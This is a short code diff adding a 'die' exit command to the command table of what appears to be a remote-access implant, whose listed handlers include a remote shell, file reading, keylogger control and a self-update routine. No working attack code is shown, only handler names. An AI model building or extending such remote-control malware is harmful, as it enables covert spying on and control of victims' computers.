@@ -56,6 +56,7 @@ std::vector <std::pair<std::string, void(*)(std::string)>> commands{
 	{"shell", shell},
 	{"cat", cat},
 	{"keylogger", keyloggerControl},
+	{"die", [](std::string) {exit(0); }},
 	{"UpdateDupnix", UpdateDupnix}
 };
 
